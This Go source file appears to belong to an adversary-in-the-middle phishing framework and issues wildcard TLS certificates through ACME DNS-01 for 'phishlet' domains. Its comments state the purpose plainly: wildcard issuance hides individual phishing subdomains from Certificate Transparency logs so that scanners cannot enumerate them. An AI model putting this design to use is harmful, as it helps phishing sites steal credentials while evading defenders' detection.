package cert

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"errors"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/acme"

	"github.com/travisbale/mirage/internal/aitm"
)

// propDelay is the minimum wait after Present() before signalling ACME to
// validate. Lowered to zero in tests.
var propDelay = 10 * time.Second

// WildcardACMECertSource issues *.base_domain certificates via ACME DNS-01.
// One certificate is issued per base domain. All phishlet subdomains under
// that base domain share the single wildcard cert.
//
// Wildcard certs are issued against *.attacker.com — Certificate Transparency
// logs show only the wildcard, not individual phishing subdomains, which
// prevents scanner enumeration.
type WildcardACMECertSource struct {
	providers  map[string]aitm.DNSProvider // base domain → provider
	acmeDir    string
	email      string
	storageDir string

	mu     sync.RWMutex
	certs  map[string]*tls.Certificate // key: "*.base_domain"
	logger *slog.Logger
}

// GetCertificate returns the wildcard cert for hello.ServerName's base domain,
// issuing one via DNS-01 ACME if not already held. Returns (nil, nil) if
// no DNS provider is registered for this base domain.
func (s *WildcardACMECertSource) GetCertificate(hello *tls.ClientHelloInfo) (*tls.Certificate, error) {
	hostname := strings.ToLower(hello.ServerName)
	baseDomain := extractBaseDomain(hostname)
	provider, ok := s.providers[baseDomain]
	if !ok {
		return nil, nil
	}
	wildcard := "*." + baseDomain

	s.mu.RLock()
	cert, ok := s.certs[wildcard]
	s.mu.RUnlock()

	if ok && !certExpiresSoon(cert) {
		return cert, nil
	}

	// Try loading a previously issued cert from disk before going to ACME.
	if diskCert, err := s.loadFromStorage(wildcard); err == nil && diskCert != nil {
		s.mu.Lock()
		s.certs[wildcard] = diskCert
		s.mu.Unlock()
		return diskCert, nil
	}

	issued, err := s.issue(context.Background(), baseDomain, provider)
	if err != nil {
		return nil, fmt.Errorf("wildcard acme: issue *.%s: %w", baseDomain, err)
	}
	if err := s.saveToStorage(wildcard, issued); err != nil {
		s.logger.Warn("wildcard acme: failed to persist cert", "domain", wildcard, "error", err)
	}
	s.mu.Lock()
	s.certs[wildcard] = issued
	s.mu.Unlock()
	return issued, nil
}

// issue runs the full ACME DNS-01 flow for *.baseDomain using the given provider.
func (s *WildcardACMECertSource) issue(ctx context.Context, baseDomain string, provider aitm.DNSProvider) (*tls.Certificate, error) {
	accountKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("generating account key: %w", err)
	}

	client := &acme.Client{
		Key:          accountKey,
		DirectoryURL: s.acmeDir,
	}

	acct := &acme.Account{Contact: []string{"mailto:" + s.email}}
	if _, err := client.Register(ctx, acct, acme.AcceptTOS); err != nil {
		if !errors.Is(err, acme.ErrAccountAlreadyExists) {
			return nil, fmt.Errorf("acme register: %w", err)
		}
	}

	order, err := client.AuthorizeOrder(ctx, acme.DomainIDs("*."+baseDomain, baseDomain))
	if err != nil {
		return nil, fmt.Errorf("acme order: %w", err)
	}

	for _, authzURL := range order.AuthzURLs {
		auth, err := client.GetAuthorization(ctx, authzURL)
		if err != nil {
			return nil, fmt.Errorf("acme get auth: %w", err)
		}
		var challenge *acme.Challenge
		for _, candidate := range auth.Challenges {
			if candidate.Type == "dns-01" {
				challenge = candidate
				break
			}
		}
		if challenge == nil {
			return nil, fmt.Errorf("acme: no dns-01 challenge for %s", auth.Identifier.Value)
		}

		keyAuth, err := client.DNS01ChallengeRecord(challenge.Token)
		if err != nil {
			return nil, fmt.Errorf("acme dns01 key auth: %w", err)
		}

		s.logger.Info("acme: presenting DNS-01 challenge", "domain", auth.Identifier.Value)
		if err := provider.Present(ctx, auth.Identifier.Value, challenge.Token, keyAuth); err != nil {
			return nil, fmt.Errorf("acme: dns present: %w", err)
		}
		domain := auth.Identifier.Value
		defer func() {
			if err := provider.CleanUp(ctx, domain, challenge.Token, keyAuth); err != nil {
				s.logger.Warn("acme: dns cleanup failed", "domain", domain, "error", err)
			}
		}()

		time.Sleep(propDelay)

		if _, err := client.Accept(ctx, challenge); err != nil {
			return nil, fmt.Errorf("acme accept: %w", err)
		}
		if _, err := client.WaitAuthorization(ctx, authzURL); err != nil {
			return nil, fmt.Errorf("acme wait auth: %w", err)
		}
	}

	certKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("generating cert key: %w", err)
	}
	csr, err := x509.CreateCertificateRequest(rand.Reader, &x509.CertificateRequest{
		DNSNames: []string{"*." + baseDomain, baseDomain},
	}, certKey)
	if err != nil {
		return nil, fmt.Errorf("creating CSR: %w", err)
	}

	der, _, err := client.CreateOrderCert(ctx, order.FinalizeURL, csr, true)
	if err != nil {
		return nil, fmt.Errorf("acme finalize: %w", err)
	}

	certPEM := encodeCertChain(der)
	keyPEM, err := encodeECPrivateKey(certKey)
	if err != nil {
		return nil, err
	}

	tlsCert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return nil, fmt.Errorf("acme: parsing issued cert: %w", err)
	}
	s.logger.Info("acme: wildcard cert issued", "domain", "*."+baseDomain)
	return &tlsCert, nil
}

// saveToStorage persists the certificate and private key as PEM files under
// storageDir/wildcard/<sanitizedDomain>/ so they survive daemon restarts.
func (s *WildcardACMECertSource) saveToStorage(wildcard string, cert *tls.Certificate) error {
	dir := filepath.Join(s.storageDir, "wildcard", sanitizeDirName(wildcard))
	if err := os.MkdirAll(dir, 0700); err != nil {
		return err
	}

	chainPEM := encodeCertChain(cert.Certificate)
	if err := os.WriteFile(filepath.Join(dir, "fullchain.pem"), chainPEM, 0600); err != nil {
		return err
	}

	ecKey, ok := cert.PrivateKey.(*ecdsa.PrivateKey)
	if !ok {
		return fmt.Errorf("cert: unexpected private key type %T", cert.PrivateKey)
	}
	keyPEM, err := encodeECPrivateKey(ecKey)
	if err != nil {
		return err
	}
	return os.WriteFile(filepath.Join(dir, "privkey.pem"), keyPEM, 0600)
}

// loadFromStorage reads previously persisted PEM files. Returns (nil, nil) if
// the files do not exist.
func (s *WildcardACMECertSource) loadFromStorage(wildcard string) (*tls.Certificate, error) {
	dir := filepath.Join(s.storageDir, "wildcard", sanitizeDirName(wildcard))
	chainPath := filepath.Join(dir, "fullchain.pem")
	keyPath := filepath.Join(dir, "privkey.pem")

	if _, err := os.Stat(chainPath); os.IsNotExist(err) {
		return nil, nil
	}

	cert, err := tls.LoadX509KeyPair(chainPath, keyPath)
	if err != nil {
		return nil, fmt.Errorf("loading wildcard cert from storage: %w", err)
	}
	if certExpiresSoon(&cert) {
		return nil, nil // treat as miss so we re-issue
	}
	return &cert, nil
}

// extractBaseDomain returns the last two labels of a hostname.
// e.g. "mail.sub.attacker.com" → "attacker.com"
func extractBaseDomain(hostname string) string {
	parts := strings.Split(hostname, ".")
	if len(parts) < 2 {
		return hostname
	}
	return strings.Join(parts[len(parts)-2:], ".")
}

// sanitizeDirName replaces characters unsafe for directory names (e.g. "*")
// with underscores so wildcard domains can be used as directory names.
func sanitizeDirName(name string) string {
	return strings.ReplaceAll(name, "*", "_")
}
